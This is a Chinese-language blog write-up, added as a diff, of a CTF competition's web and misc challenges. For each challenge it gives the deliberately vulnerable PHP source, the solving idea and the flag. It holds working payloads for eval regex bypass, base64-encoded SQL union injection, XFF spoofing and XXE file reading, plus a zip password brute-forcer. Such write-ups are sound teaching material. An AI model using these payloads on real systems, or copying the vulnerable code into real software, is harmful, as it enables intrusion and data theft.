@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>第二届海啸杯网络安全挑战赛write up | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/HXCTF/" target="_blank">HXCTF</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" style='background-image: url(http://oct8d1mqf.bkt.clouddn.com/2016-10-12-Video%20Background%20-%20Looping%20Cloud%20Animation-00-00-00-000.jpg)' data-enable=false></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      第二届海啸杯网络安全挑战赛write up
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h1 id="第二届海啸杯网络安全挑战赛write-up"><a href="#第二届海啸杯网络安全挑战赛write-up" class="headerlink" title="第二届海啸杯网络安全挑战赛write up"></a>第二届海啸杯网络安全挑战赛write up</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="1-1-？"><a href="#1-1-？" class="headerlink" title="1+1=？"></a>1+1=？</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>​    这是一道小学计算题</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>正则绕过</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ★★★★</p>
+<hr>
+</li>
+<li><p><strong>题目源码</strong></p>
+</li>
+<li><p>index.php</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+function get_the_f2ag(){
+      echo file_get_contents(&#39;flag.php&#39;);
+}
+</code></pre>
+</li>
+</ul>
+<p>@$gf = $<em>GET[‘s’];<br>if (!$gf ){<br>    highlight_file(<em>_FILE</em></em>);<br>}</p>
+<p>if(strlen($gf)&gt;40){<br>    die(‘One inch long, one inch strong!’);<br>}<br>if(!preg_match(‘/[0-9]|~|^|$|[A-Z|m-s|w-z|i-k|b-d|||{}|%]/‘, $gf)){<br>    eval($gf);<br>}else{<br>    die(‘No!’);<br>}</p>
+<p>?&gt;  </p>
+<pre><code>- waf.php
+
+```php
+&lt;?php
+error_reporting(0);
+if(!preg_match(&#39;/eval/&#39;, $_GET[&#39;s&#39;])&amp;&amp;isset($_GET[&#39;s&#39;])){
+    foreach (get_defined_functions()[&#39;internal&#39;] as $fun) {
+        if(preg_match(&#39;/&#39;.$fun.&#39;/m&#39;, $_GET[&#39;s&#39;])){
+            die(&#39;NO Hacking!&#39;);
+        }
+    }
+}
+?&gt;</code></pre><ul>
+<li>.user.ini</li>
+</ul>
+<pre><code class="php">auto_prepend_file=waf.php</code></pre>
+<hr>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<p>第一个正则过滤了大部分函数但是eval并没有过滤，第二个正则过滤了数字、取反、异或、$符、大写字母、部分小写字母以及其他字符。题目的整体意思是构造出<code>get_the_f2ag();</code>让eval去调用。但是<code>get_the_f2ag()</code>含有数字，那么就需要想办法把数字构造出来。</p>
+<p>其中!a=0那么!!a=1,两个相加再拼接成字符串</p>
+<pre><code class="php">&#39;get_the_f&#39;.(!!&#39;a&#39;%2b!!&#39;a&#39;).&#39;ag();&#39;</code></pre>
+<p>那么需要执行两次php代码，那么最终payload</p>
+<pre><code class="php">?s=eval(&#39;get_the_f&#39;.(!!&#39;a&#39;%2b!!&#39;a&#39;).&#39;ag();&#39;);</code></pre>
+<p>这里注意的是加号需要转码为url编码，因为加号在url中是空格。</p>
+<ul>
+<li><strong><em>flag</em></strong></li>
+</ul>
+<pre><code>flag{i_want_to_have_a_girlfriend_666}</code></pre><h4 id="宁静致远"><a href="#宁静致远" class="headerlink" title="宁静致远"></a>宁静致远</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>The quieter you become. The more you are able to hear.</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<p>cookie编码（base64）后的注入</p>
+</li>
+<li><p><strong>难度</strong></p>
+<ul>
+<li>★★</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>题目源码</strong></p>
+</li>
+</ul>
+<pre><code class="php">&lt;?php
+date_default_timezone_get(&#39;Asia/Shanghai&#39;);
+header(&quot;Content-Type:text/html;charset=utf-8&quot;);
+$server=&#39;127.0.0.1&#39;;
+$username=&#39;root&#39;;
+$passwd=&#39;root&#39;;
+$db=&#39;ctf&#39;;
+$conn =  new mysqli($server,$username,$passwd,$db);
+if($conn-&gt;connect_error&lt;&gt;0){
+    die(&quot;sql error&quot;);
+}else{
+    $conn-&gt;set_charset(&quot;utf8&quot;)or die(&quot;设置字符失败&quot;.$conn-&gt;error);
+}
+
+setcookie(&quot;hexo&quot;, &quot;MQ==&quot;, time()+360);
+$user = $_COOKIE[&#39;hexo&#39;];
+$check = base64_decode($user);
+$sql = &quot;select * from user where id = &#39;$check&#39;&quot;;
+
+$result = $conn-&gt;query($sql);
+$info = $result-&gt;fetch_array(MYSQL_ASSOC);
+echo $info[&#39;user&#39;];
+?&gt;</code></pre>
+<ul>
+<li><p><strong>解题思路</strong></p>
+<ul>
+<li><p>抓包后发现cookie有个hexo参数十分奇怪.base64编码，解码后发现是1，于是sql联合注入</p>
+</li>
+<li><pre><code class="sql">hexo=-1&#39;union select 1,(select group_concat(flag)from ctf.flag) -- </code></pre>
+</li>
+<li><p>base64编码传入</p>
+</li>
+<li><pre><code class="cookie">hexo=LTEndW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZylmcm9tIGN0Zi5mbGFnKSAtLSA=</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190928/1569639959188.png" alt="img"></p>
+<hr>
+<h4 id="Gzmtu学生？"><a href="#Gzmtu学生？" class="headerlink" title="Gzmtu学生？"></a>Gzmtu学生？</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>你是Gzmtu的学生吗？</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>未授权访问，ip伪造</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ★</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p><strong>题目源码</strong></p>
+<pre><code class="php">&lt;?php
+setcookie(&quot;user&quot;, &quot;0&quot;, time()+360);
+if(@$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]!=&quot;127.0.0.1&quot;){
+    die(&quot;u no student in Gzmtu&quot;);
+}else{
+    if($_COOKIE[&#39;user&#39;]==1){
+     echo &quot;flag{welcom_to_GZMTU_56456s4awdawdafafa}&quot;;        
+    }else{
+        die(&quot;u no admin!&quot;);
+    }    
+}
+?&gt;</code></pre>
+</li>
+<li><p><strong>解题思路</strong></p>
+<p>xff伪造ip为127.0.0.1然后改cookie未授权访问即可获取到flag</p>
+</li>
+<li><p><strong>flag</strong></p>
+<pre><code>flag{welcom_to_GZMTU_56456s4awdawdafafa}</code></pre><hr>
+</li>
+</ul>
+<h4 id="Who-are-you-？"><a href="#Who-are-you-？" class="headerlink" title="Who are you ？"></a>Who are you ？</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>XXE</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>XXE外部实体注入</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ★★</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><strong>题目源码</strong><pre><code class="php">&lt;?php
+libxml_disable_entity_loader(false);
+$data = @file_get_contents(&#39;php://input&#39;);
+$resp = &#39;&#39;;
+//$flag=&#39;flag{79d10626-d27f-4569-a629-c9606d0378f2}&#39;;
+if($data != false){
+  $dom = new DOMDocument();
+  $dom-&gt;loadXML($data, LIBXML_NOENT);
+  ob_start();
+  $res  = $dom-&gt;textContent;
+  $resp = ob_get_contents();
+  ob_end_clean();
+  if ($res){
+      die($res);
+  }
+</code></pre>
+</li>
+</ul>
+<p>}<br>?&gt;<br><!DOCTYPE html></p>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <title>welcome</title>
+    <link rel="stylesheet" href="./style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+</head>
+<body class="contactBody">
+<div class="wrapper">
+    <div class="title">
+
+
+<pre><code>&lt;/div&gt;
+
+
+&lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;
+    &lt;h1 id=&quot;title&quot;&gt;请输入姓名&lt;/h1&gt;
+    &lt;br/&gt;
+    &lt;br/&gt;
+    &lt;br/&gt;
+    &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;
+&lt;/form&gt;
+&lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;
+
+&lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</code></pre></div>
+
+</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript">
+    function play() {
+        return false;
+    }
+    function func() {
+        // document.getElementById().value
+        var xml = '' +
+            '<\?xml version="1.0" encoding="UTF-8"\?>' +
+            '<feedback>' +
+            '<author>' + document.getElementById('name').value+ '</author>' +
+            '</feedback>';
+        console.log(xml);
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (xmlhttp.readyState == 4) {
+                // console.log(xmlhttp.readyState);
+                // console.log(xmlhttp.responseText);
+                var res = xmlhttp.responseText;
+                document.getElementById('title').textContent = res
+            }
+        };
+        xmlhttp.open("POST", "index.php", true);
+        xmlhttp.send(xml);
+        return false;
+    };
+</script>
+
+
+```
+
+<ul>
+<li><p><strong>解题思路</strong></p>
+<p>xxe外部实体注入+伪协议读取源码</p>
+<pre><code class="http">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;
+
+&lt;feedback&gt;
+&lt;author&gt;&amp;xxe;&lt;/author&gt;
+&lt;/feedback&gt;</code></pre>
+</li>
+<li><p><strong>flag</strong></p>
+<pre><code>flag{79d10626-d27f-4569-a629-c9606d0378f2}</code></pre></li>
+</ul>
+<h4 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>EasyWeb</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>双重绕过</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ★★</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><strong>题目源码</strong></li>
+</ul>
+<pre><code class="php">&lt;?php
+//flag in flag.php
+@$payload = $_GET[&#39;s&#39;];
+if(!isset($_GET[&#39;s&#39;])){
+    highlight_file(__FILE__); 
+    die();
+}
+$payload=str_replace([&#39;php&#39;,&#39;flag&#39;], &#39;&#39;, $payload);
+if(!empty($payload)&amp;&amp;preg_match(&#39;/flag/&#39;, @$_GET[&#39;x&#39;])==md5(@$_GET[&#39;x&#39;])&amp;&amp;!empty($_GET[&#39;x&#39;]))
+    echo file_get_contents($payload);
+
+?&gt;</code></pre>
+<ul>
+<li><strong>解题思路</strong></li>
+</ul>
+<pre><code>index.php?s=flaflagg.phflagp&amp;x[]=1</code></pre><ul>
+<li><strong><em>flag</em></strong></li>
+</ul>
+<pre><code>flag{Hello_Gzmtu_66666666666}</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>this is a pic.</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>base64编码解码</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ☆</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><strong>题目源码</strong></li>
+</ul>
+<pre><code>iVBORw0KGgoAAAANSUhEUgAAAfQAAADICAIAAACRe4S/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAGjWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDIgNzkuMTYwOTI0LCAyMDE3LzA3LzEzLTAxOjA2OjM5ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAxOS0wOC0xN1QyMzoyNjo0NiswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOS0wOC0xN1QyMzoyNzo0MCswODowMCIgeG1wOk1vZGlmeURhdGU9IjIwMTktMDgtMTdUMjM6Mjc6NDArMDg6MDAiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDk4MTViMzgtZjA2YS1mNTQ4LWFhY2YtNDljOTgzMGIyNGMzIiB4bXBNTTpEb2N1bWVudElEPSJhZG9iZTpkb2NpZDpwaG90b3Nob3A6YjE2Yzg5ZTQtMzU1NC00MDRmLWFlYjEtMDY1M2U0OGFiYzBiIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6ODk3ODcyOTYtMmY0Ni1hOTQ4LWJiYmUtZWQ0MjFmNzcwMzFlIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiBkYzpmb3JtYXQ9ImltYWdlL3BuZyI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6ODk3ODcyOTYtMmY0Ni1hOTQ4LWJiYmUtZWQ0MjFmNzcwMzFlIiBzdEV2dDp3aGVuPSIyMDE5LTA4LTE3VDIzOjI2OjQ2KzA4OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDpmODIzZDcwNi0zMWI1LTBlNDYtOTdjYi0wMjE2ZWNiZjZjNTQiIHN0RXZ0OndoZW49IjIwMTktMDgtMTdUMjM6MjY6NDYrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjQ5ODE1YjM4LWYwNmEtZjU0OC1hYWNmLTQ5Yzk4MzBiMjRjMyIgc3RFdnQ6d2hlbj0iMjAxOS0wOC0xN1QyMzoyNzo0MCswODowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7heTAAAAAM1UlEQVR4nO3d73mi2hbHcXKf+x6mApkKZCqQqSCcCjQVxA7CVKCngmAFkgqCFQxWIFYwUEHu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</code></pre><ul>
+<li><p><strong>解题思路</strong></p>
+<p>base64解码保存为png图片即可出来flag</p>
+<pre><code class="python">import base64
+f = open(r&#39;flag.txt&#39;,&#39;r&#39;)
+
+s = f.read()
+
+print()
+# coding: utf-8
+f2 = open(r&#39;flag.png&#39;,&#39;w&#39;)
+flag = str(base64.b64decode(s))
+f2.write(flag)
+f2.close()
+f.close()</code></pre>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>flag</em></strong></p>
+<pre><code>flag{I_LOVE_CHINA}</code></pre><hr>
+<h4 id="小明的求助"><a href="#小明的求助" class="headerlink" title="小明的求助"></a>小明的求助</h4></li>
+<li><p><strong>题目描述</strong>：</p>
+<p>小明女朋友发了个重要文件压缩包给他，在传输过程中发生了错误导致压缩包损坏，而且密码他只知道”hlqiou”加上4位数字，如果打不开这个文件他女朋友将离他而去，你能帮助他吗？</p>
+<hr>
+</li>
+<li><p><strong>考点</strong></p>
+<ul>
+<li>文件头修复</li>
+<li>安全编程</li>
+</ul>
+<hr>
+</li>
+<li><p><strong>难度</strong></p>
+<p>​    ★★</p>
+</li>
+<li><p><strong>解题思路</strong></p>
+<p>文件头损坏修复文件头为zip</p>
+<p>编写解压脚本爆破压缩包</p>
+</li>
+</ul>
+<pre><code class="python">  # -*-coding:utf-8-*-
+  import zipfile
+  import re
+
+
+  def main():
+      with zipfile.ZipFile(&#39;test/xiaoming.zip&#39;) as zFile:#创建ZipFile对象
+          for i in range(1000,9999):
+              password=&quot;hlqiou&quot;+str(i)
+              try:
+                  zFile.extractall(path=&#39;./test/flag&#39;, pwd=bytes(password, encoding=&quot;utf8&quot;))
+                  print(password)
+              except Exception as e:
+                  pass
+
+
+  if __name__==&#39;__main__&#39;:
+      main()
+</code></pre>
+<ul>
+<li><strong><em>flag</em></strong></li>
+</ul>
+<pre><code>flag{5oiR54ix6buE6I6J6I2D}</code></pre><hr>
+<h4 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h4><ul>
+<li><p><strong>题目描述</strong>：</p>
+<p>老烟枪</p>
